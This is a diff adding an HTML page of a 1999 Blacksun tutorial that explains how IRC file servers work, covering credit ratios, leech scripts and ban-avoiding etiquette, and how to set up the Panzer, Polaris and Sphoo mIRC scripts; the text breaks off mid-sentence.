@@ -1,0 +1,733 @@
+<html>
+<head>
+<title>fserv</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td width="693"> 
+      <pre>
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I     <b>THE PROPER WAY TO</b>       I   Written by:     /
+    >                     I       <b>FSERV ON IRC</b>          I                  < 
+   /      <a href="mailto:black_mesa@gmx.de">Martin L.</a>       I_____________________________I   <a href="mailto:Dakota@the-pain.com">Gueriila</a>        \
+  /___________________________>    Version 1.0     <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+<p> <b><font size="4">TABLE OF CONTENTS:</font></b></p>
+<ul>
+  <li><b><a href="#1"> I. INTRODUCTION</a></b></li>
+  <ul>
+    <li><a href="#2">A. Introduction</a></li>
+    <li><a href="#3">B. Disclaimer/Terms of Use</a></li>
+    <li><a href="#4">C. Conventions Used in this Tutorial</a></li>
+    <li><a href="#5">D. Viewing this Tutorial</a></li>
+  </ul>
+  <li><b><a href="#6">II. STRUCTURE OF AN FSERV</a></b></li>
+  <ul>
+    <li><a href="#7">A. How an Fserv works</a></li>
+    <li><a href="#8">B. Common Commands</a></li>
+    <li><a href="#9">C. Uploading and Downloading Information</a></li>
+    <ul>
+      <li><a href="#10">1. The Credit System</a></li>
+      <li><a href="#11">2. Uploading</a></li>
+      <li><a href="#12">3. Downloading</a></li>
+    </ul>
+    <li><a href="#13"> D. Information on the Types of Scripts </a> 
+      <ul>
+        <li><a href="#14">1. Byte Ratio Scripts</a></li>
+        <li><a href="#15">2. File Ratio Scripts</a></li>
+        <li><a href="#16">3. Leech Scripts</a></li>
+      </ul>
+    </li>
+  </ul>
+  <li><b><a href="#17">&nbsp;III. PREVENTION OF GETTING BANNED</a></b></li>
+  <ul>
+    <li><a href="#18">A. Proper Fserv Manners</a></li>
+    <li><a href="#19">B. Staying on a Host's Good Side</a></li>
+    <li> <a href="#20">C. The Proper Way to Send Complaints</a></li>
+  </ul>
+  <li><b><a href="#21">IV. HOW TO SET UP YOUR OWN FSERV</a></b></li>
+  <ul>
+    <li><a href="#22">A. Selecting the Appropriate Script</a></li>
+    <ul>
+      <li><a href="#23">1. Installing mIRC Scripts</a></li>
+    </ul>
+    <li><a href="#24">B. Setting up the Script</a></li>
+    <ul>
+      <li><a href="#25">1. Setting up Panzer</a></li>
+      <li><a href="#26">2. Setting up Polaris</a></li>
+      <li><a href="#27">3. Setting up Sphoo</a></li>
+    </ul>
+    <li><a href="#28">C. Writing a Rules Message</a></li>
+    <li><a href="#29">D. Writing an Advertisement</a></li>
+  </ul>
+  <li><b><a href="#30">V. FINAL WORDS</a></b></li>
+  <ul>
+    <li><a href="#31">A. In Closing....</a></li>
+    <li><a href="#32">B. Credits/Shouts</a></li>
+    <ul>
+      <li><a href="#33">1. The Credits</a></li>
+      <li><a href="#34">2. The Shouts</a></li>
+      <ul>
+        <li><a href="#35">A. People</a></li>
+        <li><a href="#36">B. DALnet Channels</a></li>
+      </ul>
+    </ul>
+    <li><a href="#37">C. Author's Contacts</a></li>
+    <li><a href="#38">D. Links</a></li>
+    <li><a href="#39">E. Updates</a></li>
+    <li> 
+      <p><a href="#40">F. The End</a></p>
+    </li>
+  </ul>
+</ul>
+<ul>
+  <p>&nbsp; </p>
+</ul>
+  
+<p><br>
+  <br>
+  <font size="4"><b><a name="1"></a>I. INTRODUCTION</b></font></p>
+
+<p> <b><a name="2"></a>A. Introduction</b><br>
+  <br>
+  So you've been on IRC for a while and you've stumbled across a channel for fserving, 
+  but now your lost. What is all this? So you ask around, and of course, no one 
+  helps (one habit of the IRC crowd). So you finally figure part of it out and 
+  get in one (I'll get to the technicalities later). But now you're really lost. 
+  You are officially up shit creek without a paddle. So you message the host a 
+  question and he bans you. As you bow your head and say &quot;fuck&quot;, remember, 
+  some things in cyberspace aren't user friendly. Don't get pissed, just learn.<br>
+  <br>
+  <b><a name="3"></a>B. Disclaimer/Terms of Use</b><br>
+  <br>
+  The 'The Proper Way to Fserv on IRC' tutorial is: <br>
+  <br>
+  Copyright 1999<br>
+  Dakota Bryant<br>
+  All Rights Reserved<br>
+  <br>
+  So use my directives as guidelines of the distribution of it. First of all, 
+  this tutorial is to be used as an educational tool and doesn't support or advocate 
+  any illegal or immoral actions that the information in it could be used for. 
+  If you wish to distribute it through your website, newsgroup, mailing list, 
+  etc. please feel free. Just leave it unedited and un-altered. Some of the websites 
+  that I have links to at the end of this tutorial may contain illegal materials 
+  of piracy and other information that may be deemed illegal in your state, country, 
+  etc. These sites are, like this tutorial, also to be used only for educational 
+  uses only. If you agree to follow the preceding directives, then please continue 
+  reading, otherwise, please delete this tutorial from your system. Thank You.<br>
+  <br>
+  <b><a name="4"></a>C. Conventions Used in this Tutorial</b><br>
+  <br>
+  Like most things in life, this tutorial suggests that you understand certain 
+  aspects of the subject matter or common components of it. Upon writing this 
+  tutorial I realize that many people reading this are the absolute beginners. 
+  What I mean by this is that some people reading this learned of Fserving and 
+  the advantages of it, so they got mIRC, but they don't really understand how 
+  to use mIRC in the first place. So this tutorial suggest that you have an understanding 
+  of mIRC and the ideals behind it. Also that you understand your operating systems 
+  file structure (i.e. The Windows hard drive is drive C:\). And finally that 
+  you are pretty knowledgable of computers and software. You don't have to have 
+  the expertise of a hacker or programmer, but you do need some computer know-how. 
+  You also must be using mIRC, which is what I use Now if you've got all of that 
+  covered, please continue.</p>
+<p> <b><a name="5"></a>D. Viewing this Tutorial</b></p>
+<p> I wrote this tutorial in NoteTab Light, which is one of the best text editors 
+  on the planet (www.notetab.com - SHAMELESS Plug, I know). So obviously viewing 
+  it in it will work fine, and it will look fine. Windows NotePad will also work 
+  fine, as will WordPad. If it doesn't look right in whatever editor/viewer you 
+  use, then I really don't know what to say. Just use NotePad, WordPad, or NoteTab 
+  Light. Though it should look fine in anything that reads ASCII text. <br>
+  <br>
+  <font size="4"><b><a name="6"></a>II. STRUCTURE OF AN FSERV</b></font><br>
+  <br>
+  <b><a name="7"></a>A. How an Fserv Works</b><br>
+  <br>
+  Now that is something that even the most experienced Fserv hosts don't even 
+  understand. And to use one and understand what's going on, you do need to understand 
+  how it works. Now this is more theoretical than I'd like, but it's necessary. 
+  When someone sets up an fserv (which we'll get to later) all they use is a SCRIPT, 
+  which is just a few files that modifies mIRC's appearance and how it works. 
+  And what all these files do, is take the hosts place and do what the user wants 
+  based on the commands that he/she types. So when someone types the appropriate 
+  trigger for the fserv, all the script does is go &quot;Holy shit! He typed the 
+  trigger!&quot;, then it opens an everyday, nothing out of the normal, DCC Chat 
+  window with the person. Then the user types commands and the script does what 
+  it's told. So basically, all the script does is take your place. So, where someone 
+  would say to you &quot;Hey send me that Lynyrd Skynyrd mp3!&quot;, the person 
+  says &quot;get freebird.mp3&quot; to the script and the script sends it. You 
+  see, computers are real dumb, so that is why it has commands and the script 
+  uses these commands to do what you could, but faster and more efficiently. Now 
+  if that's a little daunting, don't worry. After you learn how to use one, it 
+  will either make sense or not matter. If you set up your own fserv it will make 
+  sense though.<br>
+  <br>
+  <b><a name="8"></a>B. Common Commands</b><br>
+  <br>
+  Now some commands differ from script to script, but there is a common set that 
+  all scripts use. Now, if you are familiar with DOS, then these will make sense. 
+  One syntax note: when a word appears between &lt;these&gt; , then that means 
+  you fill the space basically. So if the tutorial says &quot; get &lt;filename&gt; 
+  &quot; Then you should replace filename with the appropriate word (So if you 
+  wanted picture.jpg then you'd type get picture.jpg). And to keep this 'beginner 
+  friendly' I chose only the bare-bones commands. Please continue.<br>
+  <br>
+</p>
+<table width="50%" border="0" cellspacing="2" cellpadding="2">
+  <tr> 
+    <td><b>Command</b></td>
+    <td><b>What it Does - Example</b></td>
+  </tr>
+  <tr> 
+    <td>DIR/LS</td>
+    <td>Lists files - N/A </td>
+  </tr>
+  <tr> 
+    <td>GET</td>
+    <td>gets files - get &lt;filename&gt;</td>
+  </tr>
+  <tr> 
+    <td>CD</td>
+    <td>Changes Directory - cd &lt;foldername&gt;</td>
+  </tr>
+  <tr> 
+    <td>CD ..</td>
+    <td>Goes up a directory - cd ..</td>
+  </tr>
+</table>
+<p>Now to understand what the user/host's computer connection is, I'm going to 
+  have to explain a little bit of the fserv setup process. Now, when someone (the 
+  host) sets up an fserv, they edit and configure the script, which is just basiclally 
+  changing options. And one of those options is a ROOT DIRECTORY. The root directory 
+  is the first directory. So if his root directory is C:/Folder/First/ Then the 
+  first directory you're in when you get on his fserv is C:/Folder/First/ . So 
+  when you are changing directories and such, then you are changing directories 
+  on his machine. So basically, the script is just letting you know what's available 
+  (what folders you have accesst to) and let's you make your decisions on what 
+  files to get. You see, there is no real server involved. All it is is a script 
+  which acts like one by accpting commands and sending and getting files. Now 
+  on to sending and getting.<br>
+  <br>
+  <b><a name="9"></a>C. Uploading and Downloading Information</b><br>
+  <br>
+  <b><a name="10"></a>1. The Credit System</b><br>
+  <br>
+  The Credit System is one of the largest and most intriguing aspects of fserving. 
+  It really is one of the few things, besides just plain generosity, that would 
+  make someone want to become a host. But what is it about? Well let's suppose 
+  you get on a fserv that deals with mp3s (for legalities sake, let's say 'legal' 
+  mp3s). Ok, so the guy who hosts the thing doesn't just want to give out mp3s, 
+  I mean why would he? It's simply human nature to want something in return. So 
+  that's where the Credit System comes in. You see, if the guy's fserv script 
+  uses the Credit System, then he can 'charge' for the mp3s. And I don't mean 
+  money, I mean, well, credit. You see, here's how it works. There are three kinds 
+  of fservs, all of which have some sort of Credit System (I'll get into each 
+  one in detail later). Now, with the Credit System, the hosts sets 2 things: 
+  STARTING CREDIT and RATIO. Both of these are very important to how your fserv 
+  experience goes (and which fservs you use). Ok, lets start with Starting Credit. 
+  Starting Credit, is simply, how much Credit you start with. Much like how much 
+  money you start with in a game of Monopoly. Now remember, all values are in 
+  BYTES, not KILOBYTES. So if the Starting Credit is 1000000 , then you start 
+  with a MEGABYTE worth of credit. So what is Credit for, you ask. Well, if you 
+  want a mp3 thats 3 megs, then you need 3 megs of Credit (which is 3000000 in 
+  byte/credits form). So how do you get that credit? Uploading, which I'll get 
+  into later. Now lets get into Ratio, which is just as important as Starting 
+  Credit, if not more. Now what Ratio is, is a way for a hosts to allow more credit 
+  to be given to uploaders. Why this was even thought of in the first place is 
+  not even known, but it's still implemented in almost every script. Now, ratio 
+  is represented by the same means as in Mathematics, with 2 numbers seperated 
+  by a colon (2:3). Now how it works out in lamens terms is different. Ok, this 
+  can be confusing. If a fserv has a 1:2 ratio, than that basically means for 
+  every byte that I upload I get 2 bytes back. So, if I upload a 500k picture 
+  (equal to 500000 bytes/credits) to a this fserv, then I get 1 meg of credit 
+  back (equal to 1000000 bytes/credits). The same works for different ratios such 
+  as 1:4. Except, in this case for every byte uploaded, you get 4 bytes back, 
+  and so on. Now, what about LEECH? If you've been to the fserving channels before, 
+  you've heard that term tossed around. Well, it's actually simple. Let's suppose 
+  your on a Mp3 fserv, and it says in his RULES MESSAGE that he'll give Leech 
+  for an Mp3 of a certain song. So you know that you've got it, so you upload 
+  it. Then he'll give you Leech, which means you have infinite Credits. Basically, 
+  Leech is like being able to have anything in a store for free. There are also 
+  LEECH FSERVS, which I'll get into later. <br>
+  <br>
+  <b><a name="11"></a>2. Uploading </b><br>
+  <br>
+  Now here's a topic that evaded me for a long time. First of all, you should 
+  know by now what you upload for (Answer: Credit), and what happens when you 
+  upload (The file gets sent to the hosts computer). But how do you upload? Well, 
+  it's actually very simple. If the script takes the hosts place, but pretty much 
+  does the same things, then if you wanted to upload to the fserv, then all you 
+  have to do is do a DCC Send to the fserv! It's that simple. And after your file 
+  is done sending, then you get your credit. Always in that order. Now, there 
+  is some ethics and manners involved with this, but I'll get into that in a bit.<br>
+  <br>
+  <b><a name="12"></a>3. Downloading </b><br>
+  <br>
+  Also a very simple topic. Ok, basically, you get a file by using the command 
+  &quot;get &lt;filename&gt;&quot; (without the quotes). But first, you must have 
+  enough Credit. Which you do by uploading, of course. So this is a simpler subject 
+  and the very essense of fserving. Now, there is a limit to how much you download 
+  at a time. It depends on the fserv though. This will be discussed when I teach 
+  about hosting your own fserv later on in the tutorial.<br>
+  <br>
+  <b><a name="13"></a>D. Information on the Types of Scripts</b><br>
+  <br>
+  <b><a name="14"></a>1. Byte Ratio Scripts</b><br>
+  <br>
+  The most popular of the Scripts simply because the host is guaranteed something 
+  in return. Very simple, because it uses the exact Credit System I described 
+  above. Where the Ratio describes bytes sent:bytes returned. This is the Script 
+  type of choice for Mp3, Video, Porn, etc. hosts. As said before, this type Script 
+  is used anytime that the host wants something in return for supplying everyone 
+  with these files. Thus, it is claimed as the King of Scripts.<br>
+  <br>
+  <b><a name="15"></a>2. File Ratio Scripts</b><br>
+  <br>
+  A very bizarre type of Script. Not many people use it anymore because of the 
+  high potential of 'rip-offs'. It uses the same Credit System with the exception 
+  that instead of the Ratio being bytes sent:bytes returned , it's files sent:files 
+  returned. So you can easily see what the potential for getting 'ripped' is. 
+  For example, let's use that mp3 fserv again. So, this mp3 fserv is using a File 
+  Ratio Script with a 1:3 ratio. So after someone uploads a file (yeah, any file) 
+  then he then gets permission to download 3 files. Yeah, bytes/credit has nothing 
+  to do with anything. The problem is that I could upload 2k picture and then 
+  get 3 files for basically nothing. These are rare these days, but I suppose, 
+  are still used in trusted enviornments - Private Channels where only trusted 
+  people are given access. Though in most other cases, these aren't used that 
+  often. Surprisingly Leech Scripts are way more common.<br>
+  <br>
+  <b><a name="16"></a>3. Leech Scripts</b><br>
+  <br>
+  These are surprisingly popular, though not as popular as the Byte Ratio Scripts. 
+  These are just as they say, completely Leeched to everyone. So there are no 
+  Ratios, no Uploading, no Starting Credits, and definately no ways of getting 
+  Leech (I mean you already have it!). These also usually come with another feature, 
+  not often found on other types of Scripts, QUEUES. Very simply, Queueing is 
+  a way that you can send out minimal files while still giving them all they need. 
+  Basically a Queue is a 'slot' that, once the maximum amount of simultaneous 
+  sends has been met, will hold the file 'til a slot opens up, then send it. So 
+  if a fserv only allows 2 Simulataneous downloads and there's 2 files being sent, 
+  and I try to get a file, the script will put it in a Queue Slot, which then 
+  will send it when one of the sends are done. So it basically holds it until 
+  it can send it. If you don't understand, you will when you use one. It's still 
+  a very nice feature. These Scripts are usually found in any fservs that deal 
+  with smaller files like Text Files (*.txt). They're also found in fservs that 
+  deal with emulation and any type of fserv where the host doesn't want anything 
+  in return.<br>
+  <br>
+  <font size="4"><b><a name="17"></a>III. PREVENTION OF GETTING BANNED</b></font><br>
+  <br>
+  <b><a name="18"></a>A. Proper Fserv Manners</b><br>
+  <br>
+  You will soon learn that there is no worse feeling than being banned. As an 
+  experienced user and host, I understand both sides. But unfortunately, the user 
+  must follow the host's rules. And that's really understandable cosidering that 
+  hosting a fserv is a service and a major pain in the ass sometimes, so the user 
+  really isn't a priority. And that's why most hosts don't even pay attention 
+  to their fservs, cause they don't wanna deal with the users (Though I don't 
+  like that fact). So, as a user, if you don't follow the rules you will be kicked/banned 
+  so you need to learn some fserv ethics which will help you in the future. Hell, 
+  if you follow, you may not be banned ever again.<br>
+  <br>
+  <b><a name="19"></a>B. Staying on a Host's Good Side</b></p>
+<p> Now I don't wanna come off as saying that you've gotta kiss the host's ass. 
+  That's not it at all. You see, the whole user-host relationship is easy to understand 
+  - IT SHOULDN'T EXIST! It's very simple, don't talk to the host unless absolutely 
+  necessary. Don't ask a bunch of questions and don't voice any opinions. They 
+  just don't care. If the host talks to you, then of course, talk back, but you 
+  shouldn't be an asshole and complain about the unfixable - Speed, messed up 
+  Sends, etc. And never under any circumstances, argue with the host, because 
+  it won't last long. As soon as you say something like that you will get banned. 
+  Hosts don't wanna hear it. The whole act of complaining to a host will be discussed 
+  next, but you really shouldn't have much to complain about except something 
+  being wrong with the Script (like not getting credit for uploads, nothing sending, 
+  etc.). It comes down to this: The host is doing you a service by hosting the 
+  fserv so you really don't have that much room to run your mouth to him. And 
+  most aren't open to open to constructive criticism or any suggestions so just 
+  do your business and leave. It's almost like prostitution: You upload (Pay), 
+  then you download (Fuck),then you leave. So do your business and leave. And 
+  follow their Rules Message, that's why it's there. <br>
+  <br>
+  <b><a name="20"></a>C. The Proper Way to Send Complaints</b><br>
+  <br>
+  Ahhhh.... The infamous art of Customer Service. Basically this boils down to 
+  this: Never complain about the unfixable. If the connections slow, wait longer. 
+  If the sends aren't working, try again. Just don't complain. I guarantee ban 
+  if you complain. And it's understandable cause you're just being an asshole. 
+  But if there is something seriously wrong, like the Script isn't working right, 
+  then you have every right to complain, and do so. But make sure something is 
+  really wrong, and you're not doing something. But if you feel something is seriously 
+  wrong, then msg the host and tell them. They may get pissed if nothing's wrong, 
+  but they'll appreciate it if something is really wrong. So just use good judgement 
+  and avoid DCC Chat. Just go into the channel they're in and double click on 
+  their handle. Most hosts like it better that way. Or you could try it in the 
+  fserv windows, though they may not pay any attention to it. Well use good judgement 
+  and you'll learn how to do it perfectly with experience. One last note, when 
+  you tell them you think something is wrong, choose your words carefully; don't 
+  just blather on about how it's not sending and act like it's there fault, just 
+  say nicely and politely that you believe something isn't right and ask if they 
+  know what is wrong, if they don't, then well, fuck it.</p>
+<p><b><font size="4"><a name="21"></a>IV. HOW TO SET UP YOUR OWN FSERV</font></b></p>
+<p> <b><a name="22"></a>A. Selecting the Appropriate Script</b><br>
+  <br>
+  When setting up your own Fserv you have to know what the purpose is, then choose 
+  your Script. For example, a porn picture fserv would most likely want to get 
+  more pictures. Thus, it would use a Byte Ratio Script. Though, a Edgar Allan 
+  Poe E-Book fserv would most likely be a Leech Script because of the low byte 
+  size and the fact that those are public domain in the first place. So you should 
+  choose your Script carefully. Next, I will examine 2 of the most popular Scripts, 
+  and one I just like.</p>
+<p> <b><a name="23"></a>1. Installing mIRC Scripts</b></p>
+<p> I understand that some people do not understand how to install a script. First 
+  of all, there are two different forms that you get the files: Either a zipped 
+  archive (*.zip) or an executable file (*.exe). Now when you open either one, 
+  they should say where they are going to put the files. Now, you have the option 
+  to change this location, which is suggested if the files are in a .zip . So, 
+  once you've got the files on your machine, all you do is copy mirc32.exe and 
+  mlink32.exe into the directory where you put the Script files. So if you put 
+  the files in C:/Script/ , Then you've past mirc32.exe and mlink32.exe inot C:/Script/ 
+  . That's all. <br>
+  <br>
+  <b><a name="24"></a>B. Setting Up the Script</b></p>
+<p> Here I'll explain the basic setup process of the before-mentioned Scripts: 
+  Panzer, Polaris, and Sphoo. These three Scripts represent each type, Panzer 
+  is a File Ratio and Leech Script, Polaris is a Leech Script, and Sphoo can be 
+  all three. I'll also include a small review of each in the following sections. 
+  I do suggest reading each one, or at least Panzer, then the one your using, 
+  being that I cover most of the Script setup procedure in Panzer and many of 
+  the configurations/terms are the same in the other Scripts.</p>
+<p> <b><a name="25"></a>1. Setting Up Panzer</b><br>
+  <br>
+  Now this one is so easy, and that's why it's the most popular Script on earth. 
+  It's a Byte Ratio Script and uses a friendly user interface that rocks. But 
+  first head to <a href="http://members.tripod.com/%7EArntS/" target="_blank">http://members.tripod.com/~ArntS/</a> 
+  and get the latest version. Ok, when you run mIRC with the Script there's a 
+  good bit of graphical change, but you can figure that out. All I'm doing is 
+  helping you set it up. First go to a button called &lt;&lt;Panzer&gt;&gt; at 
+  the top and choose Fserve Setup. Then right click and choose choose 'Setup/Change', 
+  then choose '1'st Time Setup'. Then change the options to your liking. You should 
+  be able to figure out each of them. Note that Ratio is set with a single number, 
+  1:2 is 2 , 1:3 is 3, etc. Also, the Root Directory is the initial or home directory 
+  that has all the folders/files of your fserv. Basically for further configuration 
+  just use the &lt;&lt;Panzer&gt;&gt; button and look for the options. The only 
+  other necessary configurations is Starting Credit, Rules MSG, and Advertising. 
+  I'll walk you through them. But keep in mind that I am considering that you 
+  already have the 'Fserv Setup' window open and your right clicking to get to 
+  the options. Now we setup the Starting Credit. It should be under &quot;Setup/Change&quot;, 
+  &quot;Change&quot; , &quot;Starting Credit&quot;. Keep the number at least 5 
+  digits. Just to make it look useful, and type FREE CREDIT to use Panzer as a 
+  Leech Script. The Rules Msg is also very simple. Ok, the Rules Msg options are 
+  under &quot;Setup/Change&quot; then Rules Msg. You'll notice there are three 
+  options: Change, Enable, and Disable. Ok, if you want a Rules Message (which 
+  you should know what it is by now), then choose Enable, if you don't think you 
+  need one, choose Disable. Now, notice that all your options are viewable in 
+  the &quot;Fserv Setup&quot; window. Ok, so if you chose 'Enable' then now go 
+  back to the Rules Msg options and choose 'Change'. Now Notepad (or your default 
+  text editor) will pop up and you just have to write your Rules message. I'll 
+  get to that in detail later. Finally, the Advertising configurations can be 
+  tricky. Ok, now go to the Fserv Setup window and right click and choose 'Custom 
+  Advertise'. Then choose 'Make New'. Note that if you don't make a new advertisement 
+  you do get a generic one with only info and no descriptions. Ok, back to advertising. 
+  Now, after you chose 'Make New' a small window should've popped up. Now type 
+  out your advertisement. Now the confusing part is getting the ads to run in 
+  channels. Well, the best way to do this from the start is to join all the channels 
+  you would ever want your script's ads to run. Then right click in one of the 
+  CHANNEL windows and choose 'Channel Ad. Settings' and a window should pop up 
+  with all the current channels your in listed. Now right click anywhere and choose 
+  'Setting' , then Add, then choose the channel you want to add. Then a window 
+  pops up asking for an advertising code. For beginner's just use code 1. So when 
+  that window pops up just put in 1 and click ok. Well, that's about it. Then 
+  you just join those channels that you cut on advertising and wait for users 
+  to join. A few final notes, you have to join the channels you want to advertise 
+  in and to put your fserv online, you have to go to the Fserv Setup window and 
+  right click and choose go online. Well, that's about it. Also remember to play 
+  with Panzer's options, cause some of it's best features are kind of hidden. 
+  Once you master it it is one of the best Scripts out there. Also remember to 
+  right clickin channel windows to get more of the advanced features. <br>
+  <br>
+  <b><a name="26"></a>2. Setting up Polaris</b></p>
+<p> Now this Script can be a little daunting at first, but once you set up the 
+  initial fserv it seems to get easier. The script, unlike Panzer, is completely 
+  a Leech Script. So, you're not guaranteed anything in return. This is best for 
+  dealing small files and is also popularly used to advertise FTP Servers. But 
+  I'm not explaining those. First, you've gotta download the Script at <a href="http://members.tripod.com/%7EArntS/" target="_blank">http://members.xoom.com/Polaris_IRC/</a> 
+  and set it up like normal. Now when you start it up, you'll realize that this 
+  completely changes the look of mIRC. Though that doesn't mean it's that much 
+  different. It acts the exact same way. Ok, to start your fserv, first you must 
+  go to the button at the top with the name 'Polaris IRC'. Then choose 'Script 
+  Settings', then 'File Server'. Now before I get into the actual configuration 
+  of Polaris, let me remind you that Leech Scripts use a Queueing system which 
+  I described above in the &quot;Leech Scripts&quot; section. Now you immediately 
+  see that this is a lot different than Panzer. But first things first. The best 
+  way to teach you how to configure Polaris is to expain each part. Ok, first 
+  of all you see the two squares that say 'Max Sends' and 'Max Queues'. Ok, now 
+  under 'Max Sends' their are two boxes, one for 'Each' and one for 'Total'. Now 
+  'Each' is for how many sends can each user have. So if it's two, each user can 
+  only download two files at once. The 'Total' means how many total sends can 
+  go out before the Script begins Queueing files. So if it's 3, then once you're 
+  sending out 3 files and someone makes another request, then the Script will 
+  put it in Queue slot one. The 'Max Queues' options are exactly the same, except 
+  when the 'Each' and 'Total' numbers have been surpassed, the user gets a message 
+  saying he'll have to wait and request the file again. If you don't understand 
+  what the values mean completely, you can just leave them at their defaults, 
+  and your serv should work fine. Next on our learning agenda is the 'Advertising 
+  Channels' square. Now this is very simple. All you do is type in the name of 
+  a channel you want to advertise in and click on 'Add'. That's it. Of course 
+  you must join the appropriate channels for your ads to run. Next is those three 
+  small squares under 'Max Sends'. Ok, the first one, 'File Server Chat', I honestly 
+  am not sure what that is for. If you can help, please <a href="mailto:Dakota@the-pain.com">email 
+  me</a> and tell me. I'll give you credit. The other two I do know what they're 
+  for luckily. First is 'Slot Announcer'. Now, what this does is actually one 
+  of the coolest things about Polaris. You see, when you're Fserv is full, then 
+  someone leaves, the Script will alert the channel of the newly free slot, if 
+  that is activated that is. Now, the 'Enable on Start' is also very simple. If 
+  that's on, then your Fserv will start as soon as you connect to mIRC. Simple, 
+  eh? Well the next to options follow suit. First is 'Max Users' which is the 
+  maximum amount of users allowed on your fserv at once. Next is 'Ad Delay Time' 
+  which is how many minutes your Script will wait before posting another advertisement 
+  for your fserv. The 'Note' option is just a note that will be displayed in the 
+  advertisement. Ok, now after you've got all of that filled out, then click on 
+  Trigger 1. Now here's one of the great aspects of Polaris, you can have seperate 
+  fservs. Ok, so now click 'Enable Trigger' then go to the 'Trigger' box and type 
+  your trigger. Then go down to 'Root Directory' and choose it (look above at 
+  the Panzer section for more information). Then pick the 'Welcome File' which 
+  is just your Rules Message (just make a new .txt file and write one and save 
+  it). Now your done for the most part. If you wist to have a seperate fserv with 
+  a different trigger then choose 'Trigger 2' and make a new one. But don't worry 
+  about advetising them both, Polaris will do that for you. There are a few options 
+  you need to know about. One is Queue Manager, which will let you remove files 
+  from your Queue list (In case you have an abusive user for example). That's 
+  under 'Polaris IRC', then 'Queue Manager. Just choose a file and push 'Rem'. 
+  Another option that you may want to know about is the 'FTP Ad' option which 
+  is found at 'Polaris IRC', then '--&gt;FTP Ad&lt;--'. This pretty straight forward 
+  and if you can setup an FTP Server you can understand this. The last option 
+  is the 'Request Ad'. The 'Request Ad' option can be found at 'Polaris IRC' , 
+  then 'Script Settings' , then 'Request Ad'. You'd use this if you're looking 
+  for a specific file. All you do is type what you're wanting in the 'Request' 
+  box and add channels to advertise, and choose whether to start the Request Ad 
+  on Connect and then choose the Ad Delay. Finally, when everything is set up, 
+  join all the channels you want selected to advertise in and right click in the 
+  channel window and choose 'Advertisements', then 'File Server' , then 'Start'. 
+  Congradulations, you're using Polaris.<br>
+  <br>
+  <b><a name="27"></a>3. Setting up Sphoo </b><br>
+  <br>
+  Now here is a real gem. Why? Well, because it has all the features of the previous 
+  two Scripts, but with one option that puts it a niche higher than all other 
+  Scripts. And that is the option to switch between the type of Script it is. 
+  So, if you dare, go to <a href="http://www.sphoo.f2s.com" target="_blank">http://www.sphoo.f2s.com</a> 
+  and download the latest version. Ok, once you downloaded it, you'll notice you 
+  do something different to load it. Whether you downloaded the .Zip or the .Exe 
+  , you still extract the files into the mIRC (probably C:/mirc if your uncertain). 
+  Then, you run mIRC like normal. Note that there is very little graphical change, 
+  which is good if your a beginner. Now here's the odd part. To start the script, 
+  type this in the Status Window: /load -rs sserv121.mrc . Now that is a little 
+  weird, but once it's in there Sphoo has been loaded onto your mIRC client. Now 
+  press F12 and let's get into it. Now when the window pops up, click 'Enable 
+  SphooServer' and take a look around. Most of these options should be familiar 
+  if you're moving up to Sphoo Script from Panzer or Polaris. The trigger option 
+  is pretty straight forward, but for the beginner I'd leave the square beside 
+  it unchecked for obvious reasons (Basically it's too advanced). The 'Home Directory' 
+  is, of course, the root or first folder of your Server. Now the next option, 
+  'Multiple Home Directories', is a great feature. This will let you set up multiple 
+  fservs, with unique Home Directories, just like Polaris. Just click on add, 
+  type a trigger, and fill in the other values. The next option is the most intriguing 
+  reason to use Sphoo in the first place. I don't know of any other scripts that 
+  have this option, and that is to switch the Script between the three basic types: 
+  File Ratio, Byte Ratio, and Leech. So choose whichever and fill in the appropriate 
+  options (I explained each type in detail above; see the Table of Contents). 
+  Now a lot of people get confused about the next option, 'Logging'. But basically 
+  all it does is keep a list of 1)What was uploaded/downloaded , 2)Who did the 
+  uploading/downloading , and 3)When they did it. So it's really nothing serious/necessary 
+  , but if you do want it, then fill in the necessary fields as desired. Now on 
+  to the 'Other Options'. The six options at the top, with the larger white boxes 
+  beside them, should be familiar to you, except Advert Interval, which is just 
+  how much time is between ads (in seconds). Now the 'Add Channel to Channels 
+  List On Join' will add all the channels you join while the box is checked to 
+  the 'Channel List' which I'll get to later. The option beside it will join every 
+  channel in the 'Channels List' when you connect to mIRC. The 'Show User has 
+  just left !Trigger' option is just a slot announcer, like on Polaris (look above), 
+  and the option beside it is self-explanatory. The last two options are: 'Enable 
+  Function Keys' and 'Enable Fileserver READ Command', both of which are reccomended 
+  to be on. Now the 'Channel List' button will allow you to edit what channels 
+  you advertise in. All you have to do is type the name in the 'Channel' box and 
+  push 'Add'. The 'Advertise On' option lets you decide whether to advertise in 
+  all the channels your in, or to just advertise in channels on your 'Channels 
+  List'. It is suggested that you not use the 'OpHelp' option as of yet, because 
+  it's unnecessary for beginners to the Script. But the 'Banning' option is absolutely 
+  necessary. This is the way to ban those assholes and idiots from your fserv. 
+  All you do is type their handle in the 'Handle' box and push 'Add' and that's 
+  it. You can also Remove them later if you wish. The 'Announcements' option lets 
+  you make announcements in the channel and the 'Welcome Message' is the equivalent 
+  of a 'Rules Message' for Panzer. You just type it out and push 'Ok'. The last 
+  option is one of the most important. This is what you use to keep those viruses 
+  and improper files out of your fserv. Just click on 'Reject File Extensions' 
+  and type in the extension in the black fieild and press 'Add'(i.e. to block 
+  .jpg pictures, you'd type .jpg). I'd suggest typing a message in the long blank 
+  field to post to the person uploading illegal files. If you check 'Alert Me' 
+  the script will tell you if someone trys to upload something you don't like. 
+  The 'Duplicate File Rejection' option lets you decide how the Script should 
+  handle files uploaded (or not uploaded) that have the same filename as something 
+  on your serv already. And if you create a filelist then it will do, as it says, 
+  make a big filelist with everything you have on the serv. Ok, now close all 
